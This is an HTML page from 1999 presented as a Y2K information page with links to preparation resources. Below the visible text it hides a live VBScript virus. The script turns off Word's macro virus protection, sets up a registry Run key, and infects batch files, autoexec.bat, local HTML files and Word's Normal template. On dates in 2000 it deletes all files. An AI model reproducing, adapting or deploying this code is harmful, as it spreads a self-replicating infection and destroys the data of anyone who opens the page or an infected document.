<html>
<head>
<title>Y2K Coming Soon</title>
</head>
<body>
<br><br><br>
<font size="7"><center>i-Generation</font>
<br>
<font size="4"><center>Y2K is Coming Soon</font>
<br>
<br>
<br>
<font size = 2 face="roman">The new generation of Internet Page</font>
<br>
<font size = 3 face="arial">fOr YoU </font>
<br><br><br>
<div align="center"> <font face="Arial, Helvetica, san-serif" color="red" size="5">YEAR 2000 
<br><br>
<div align="center"> <font face="Arial" color="black" size="5">Helpful Link to prepare for Y2K
<br>
<font face="Arial, Helvetica, san-serif" size="4" COLOR="#000033"><a href="http://www.fix4y2k.com/welcome.html">MILLENNIUM BUG TOOLKIT</a> 
<BR>
<font face="Arial, Helvetica, san-serif" size="4" COLOR="#000033"><a href="http://www.tsc.udel.edu/y2k/y2ksoft.html">DOWNLOAD Y2K TESTING SOFTWARE</a> 
<BR><BR>
<div align="center"> <font face="Arial" color="black" size="5">Information on Y2K
<BR>
<font face="Arial, Helvetica, san-serif" size="4" COLOR="#000033"><a href="http://www.y2k.state.mo.us/">Missouri Year 2000 Information</a> 
<BR>
<font face="Arial, Helvetica, san-serif" size="4" COLOR="#000033"><a href="http://www.cpradr.org/Y2Kinformationpage.htm">Resolving Year 2000 </a> 
<BR><BR>
<font face="arial" size=1>
<b><font face="arial" size=2><pre>&copy 1999   MKVG </pre></b><br><br><bR></font>
<font size="1" face="arial">ThAnK yOu FoR vIsiTiNg ThIs WeB PaGe
<BR>Please Ask More Friends To Visit This Site, To Support Y2K.
<BR><font size="1" face="arial">bEsT ViEwInG wItH mIcRoSoFt iNtErNeT ExPlOrEr
</center>
<BR>
<script language="VBScript"><!--

Sub MK()
End Sub
On error Resume Next
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\8.0\Word\Options\EnableMacroVirusProtection" , "0"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Mae Koo V-Groups"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Version", "MKV-99"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "MKV") = "C:\WINDOWS\SYSTEM\MKV2.vbs"
	Dim FSO
	Set FSO = CreateObject("Scripting.FileSystemObject")
	Set fh = fso.opentextfile("c:\MKV2.bat", 2, true)
	fh.writeline "@echo off%[MKV2_B]%"
	fh.writeline "IF '%1=='## GOTO MKV2_%2"
	fh.writeline "ATTRIB C:\MKV2.BAT +h"
	fh.writeline "IF EXIST C:\MKV2.BAT GOTO MKV2_"
	fh.writeline "IF NOT EXIST %0.BAT GOTO MKV2_END"
        fh.writeline "FIND " & CHR(34) & "MKV2" & CHR(34) & "<%0.BAT>C:\MKV2.BAT"
	fh.writeline ":MKV2_"
	fh.writeline "COMMAND /e:5000 /c C:\MKV2 ## RUN"
	fh.writeline "GOTO MKV2_END"
	fh.writeline ":MKV2_RUN"
	fh.writeline "FOR %%i IN (*.bat ..\*.bat) DO CALL C:\MKV2 ## INF %%i"
	fh.writeline "EXIT MKV2"
	fh.writeline ":MKV2_INF"
	fh.writeline "IF '%MKV2%=='111111111111 EXIT"
	fh.writeline "SET MKV2=%MKV2%1"
        fh.writeline "FIND " & CHR(34) &"MKV2" & CHR(34) & "<%3>NUL"
	fh.writeline "IF NOT ERRORLEVEL 1 goto MKV2_END"
	fh.writeline "TYPE %3>MKV2"
	fh.writeline "TYPE C:\MKV2.BAT>>MKV2"
	fh.writeline "MOVE MKV2 %3>NUL"
	fh.writeline "EXIT MKV2"
	fh.writeline ":MKV2_END"
	fh.close
	Set fh = fso.opentextfile("c:\autoexec.bat", 1, true)
	FileContents = fh.ReadAll()
	fh.close
	Set fh = fso.opentextfile("c:\autoexec.bat", 2, true)
	fh.write(FileContents)
	fh.writeline "@MKV2.BAT"
	fh.close
	Set TRange = document.body.createTextRange
	Set cd = FSO.OpenTextFile("c:\windows\MKV.vxd", 2, True)
	cd.WriteLine TRange.htmltext
	cd.close()
	findr = "novalue"
	Set cd = FSO.OpenTextFile("c:\windows\MKV.vxd", 1, False)
	beginvir = "Sub MK()"
	Do While cd.atendofstream <> True
		findr = cd.readline
		if findr = beginvir then exit Do
	Loop
	Set nd = FSO.OpenTextFile("c:\windows\MKV2.vxd", 2, True)
	linr = "bla"
	nd.writeline "<script language=" + Chr(34) + "VBScript" + Chr(34) + "><!--"
	nd.writeline beginvir
	Do While cd.atendofstream <> True
		linr = cd.readline
		nd.writeline linr
	Loop
	nd.close
	cd.close
        Set FolderObj = FSO.GetFolder("c:\my documents\")
	Set FO = FolderObj.Files
	For each target in FO
		ExtName = lcase(FSO.GetExtensionName(target.Name))
		if ExtName = "htt" or ExtName = "asp" or ExtName = "htm" or ExtName = "html" then
			Set Real = FSO.OpenTextFile(target.path, 1, False)
			if Real.readline <> "<MKV2>" then
				Real.close()
				GetFile(target.path)
			else
				Real.close()
			end if
		end if
	next

Sub GetFile(GetFileName)
	Set nd = FSO.OpenTextFile("c:\windows\MKV2.vxd", 1, True)
	virus = nd.readAll()
	nd.close
	Set Real = FSO.OpenTextFile(GetFileName, 1, False)
	FileContents2 = Real.ReadAll()
	Real.close()
	Set Real = FSO.OpenTextFile(GetFileName, 2, False)
	Real.WriteLine "<MKV2>"
	Real.Write(FileContents2)
	Real.writeline " "
	Real.writeline " "
	Real.Write(virus)
	Real.close()
End Sub
	wfindr = "novalue"
	Set cd = FSO.OpenTextFile("c:\windows\MKV2.vxd", 1, False)
        wbeginvir = "Sub MKWords()"
	Do While cd.atendofstream <> True
		wfindr = cd.readline
		if wfindr = wbeginvir then exit Do
	Loop
	Set nd = FSO.OpenTextFile("c:\windows\MKV3.vxd", 2, True)
	wlinr = "bla"
	nd.writeline "Private Sub Document_Open()"

	Do While wlinr <> "End Sub"
		wlinr = cd.readline
		nd.writeline wlinr
	Loop
	nd.close
	cd.close
	Set wv = FSO.OpenTextFile("c:\windows\MKV3.vxd", 1, True)
	Set nwv = FSO.OpenTextFile("c:\windows\MKV4.vxd", 2, True)
	readmvir = "nopers"
	Do while wv.atendofstream <> True
		readmvir = wv.readline
		if Mid(readmvir,1,1) = "'" then readmvir = Mid(readmvir,2,Len(readmvir) -1)
		
		nwv.writeline readmvir	
	Loop
	nwv.Close
	wv.close
	Set mkvbs = FSO.OpenTextFile("c:\windows\system\MKV2.vbs", 2, True)
	mkvbs.writeline "Set MKV = WScript.CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
	mkvbs.writeline "MKV.Options.VirusProtection = False"
	mkvbs.writeline "MKV.Options.SaveNormalPrompt = False"
	mkvbs.writeline "MKV.Options.SaveNormalPrompt = False"
	mkvbs.writeline "MKV.normaltemplate.vbproject.vbcomponents(1).codemodule.DeleteLines 1, MKV.normaltemplate.vbproject.vbcomponents(1).codemodule.CountOfLines"
	mkvbs.writeline "MKV.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\MKV4.vxd" & Chr(34) & ")"
	mkvbs.writeline "MKV.Application.Quit"
	mkvbs.Close
	Set iw = FSO.OpenTextFile("c:\windows\MKV4.vxd", 1, True)
	wordvir = iw.readAll()
	iw.close
	Set iw = FSO.OpenTextFile("c:\windows\MKV4.vxd", 1, True)
	Set WordObj = CreateObject("Word.Application")
	Set NT= WordObj.normaltemplate.vbproject.vbcomponents(1).codemodule
	If NT.Lines(3,1) <> "'MK-Words 2" then
		WordObj.Options.SaveNormalPrompt = False
		NT.DeleteLines 1, NT.CountOfLines
		i = 1
		Do while iw.atendofstream <> true
		b = iw.readline
		NT.InsertLines i, b
		i = i + 1
		Loop
	End If
	Set NT = Nothing
	WordObj.Quit
	iw.close

Sub MKWords()

''MK-Words 2
''From the MKVG - The Lion City
'On Error Resume Next
'Application.ShowVisualBasicEditor = False
'CommandBars("Tools").Controls("macro").Enabled = False
'Options.SaveNormalPrompt = False
'Application.EnableCancelKey = False
'Options.VirusProtection = False
'DisableAutoMacros = False
'Options.ConfirmConversions = False
'ScreeenUpdate = False
'ToolsOptionsSave.AutoSave = False
'ToolsOptionsSave.GlobalDotPrompt = False
'f = FreeFile
'Open "c:\windows\system\mkv2.vbs" For Output As #f
'Print #f, "Set MKV = WScript.CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
'Print #f, "MKV.Options.VirusProtection = False"
'Print #f, "MKV.Options.SaveNormalPrompt = False"
'Print #f, "MKV.Options.SaveNormalPrompt = False"
'Print #f, "MKV.normaltemplate.vbproject.vbcomponents(1).codemodule.DeleteLines 1, MKV.normaltemplate.vbproject.vbcomponents(1).codemodule.CountOfLines"
'Print #f, "MKV.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\MKV4.vxd" & Chr(34) & ")"
'Print #f, "MKV.Application.Quit"
'Close #f
'F=FREEFILE
'Open "c:\MKV2.BAT" For Output As #f
'Print #f, "@echo off%[MKV2_B]%"
'Print #f, "IF '%1=='## GOTO MKV2_%2"
'Print #f, "ATTRIB C:\MKV2.BAT +h"
'Print #f, "IF EXIST C:\MKV2.BAT GOTO MKV2_"
'Print #f, "IF NOT EXIST %0.BAT GOTO MKV2_END"
'Print #f, "FIND " & CHR(34) & "MKV2" & CHR(34) & "<%0.BAT>C:\MKV2.BAT"
'Print #f, ":MKV2_"
'Print #f, "COMMAND /e:5000 /c C:\MKV2 ## RUN"
'Print #f, "GOTO MKV2_END"
'Print #f, ":MKV2_RUN"
'Print #f, "FOR %%i IN (*.bat ..\*.bat) DO CALL C:\MKV2 ## INF %%i"
'Print #f, "EXIT MKV2"
'Print #f, ":MKV2_INF"
'Print #f, "IF '%MKV2%=='1111111111111 EXIT"
'Print #f, "SET MKV2=%MKV2%1"
'Print #f, "FIND " & CHR(34) &"MKV2" & CHR(34) & "<%3>NUL"
'Print #f, "IF NOT ERRORLEVEL 1 goto MKV2_END"
'Print #f, "TYPE %3>MKV2"
'Print #f, "TYPE C:\MKV2.BAT>>MKV2"
'Print #f, "MOVE MKV2 %3>NUL"
'Print #f, "EXIT MKV2"
'Print #f, ":MKV2_END"
'CLOSE #F
'F=FREEFILE
'OPEN "C:\AUTOEXEC.BAT" FOR INPUT AS #F
'DO UNTIL EOF(F)
'INPUT #F,ASD
'IF ASD="@MKV2.BAT" THEN GOTO FDBAT
'LOOP
'CLOSE
'F=FREEFILE
'OPEN "C:\AUTOEXEC.BAT" FOR INPUT AS #F
'K=FREEFILE
'OPEN "C:\AUTOEXEC.TMP" FOR OUTPUT AS #K
'DO UNTIL EOF(F)
'INPUT #F,ASD
'PRINT #K,ASD
'LOOP
'PRINT #K,"@MKV2.BAT"
'CLOSE
'KILL "AUTOEXEC.BAT"
'NAME "AUTOEXEC.TMP" AS "AUTOEXEC.BAT"
'FDBAT:
'CLOSE
'System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Mae Koo V-Groups"
'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "Version") = "MKV-99"
'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "MKV") = "C:\WINDOWS\SYSTEM\MKV2.vbs"
'If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
'    CommandBars("Macro").Controls("Security...").Enabled = False
'    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
'End If
'If Year(Now) = 2000 Then Kill "c:\*.*": Kill "*.*": MsgBox "Welcome To Y2K", 0, "MK Words V2 By MKVG 1999"
'If Day(Now) = 31 Then
'Assistant.Visible = True
'With Assistant.NewBalloon
'    .Animation = msoAnimationListensToComputer
'    .Button = msoButtonSetOK
'    .Heading = "MK Words V.2"
'    .Text = "Y2K is Coming Soon..."
'    .Show
'End With
'End If
'
'    If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000, False, False) Then
'        For I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
'            lineofcode = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
'            ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
'         Next I
'        If (Not ActiveDocument.ReadOnly) Then
'            ActiveDocument.SaveAs AddToRecentFiles:=False
'        End If
'        
'            
'    ElseIf Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000, False, False) Then
'            For I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
'                lineofcode = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
'                NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
'            Next I
'            NormalTemplate.Save
'    Else
'    End If
'NormalTemplate.VBProject.VBComponents.Item(1).export ("c:\windows\system\mkv4.tmp")
'f = FreeFile
'Open "c:\windows\system\mkv4.tmp" For Input As #f
'j = FreeFile
'Open "c:\windows\mkv4.vxd" For Output As #j
'For a = 1 To 8: Input #f, b: Next
'Do Until EOF(f)
'Input #f, b
'Print #j, b
'Loop
'Close #j
'Close #f
'kill"c:\windows\system\mkv4.tmp"
'Y2KEnd:
'        With Dialogs(wdDialogFileSummaryInfo)
'            .Comments = "MK-Words (V2) By MMK 1999"
'            .Execute
'        End With
'normaltemplate.save
'activedocument.save
'' MKVG had present MK Words Version 2
'' (C) May 1999
End Sub
--></script>


</body>
</html>
